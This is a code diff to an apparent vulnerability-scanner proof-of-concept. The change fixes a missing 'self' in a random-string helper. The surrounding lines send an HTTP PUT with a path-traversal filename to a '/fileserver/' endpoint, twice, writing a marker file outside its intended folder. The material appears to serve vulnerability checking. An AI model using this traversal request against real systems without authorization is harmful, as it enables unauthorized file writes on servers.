@@ -46,7 +46,7 @@ class Poc(ABPoc):
             }
         }
 
-    def random_str(len):
+    def random_str(self,len):
         str1 = ""
         for i in range(len):
             str1 += (random.choice("ABCDEFGH1234567890"))
@@ -65,7 +65,7 @@ class Poc(ABPoc):
             socket.setdefaulttimeout(timeout)
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((ip, port))
-            filename = random_str(6)
+            filename = self.random_str(6)
             flag = "PUT /fileserver/sex../../..\\styles/%s.txt HTTP/1.0\r\nContent-Length: 9\r\n\r\ncscan233\r\n\r\n" % (
                 filename)
             s.send(flag)
@@ -94,7 +94,7 @@ class Poc(ABPoc):
             socket.setdefaulttimeout(timeout)
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((ip, port))
-            filename = random_str(6)
+            filename = self.random_str(6)
             flag = "PUT /fileserver/sex../../..\\styles/%s.txt HTTP/1.0\r\nContent-Length: 9\r\n\r\ncscan233\r\n\r\n" % (
                 filename)
             s.send(flag)
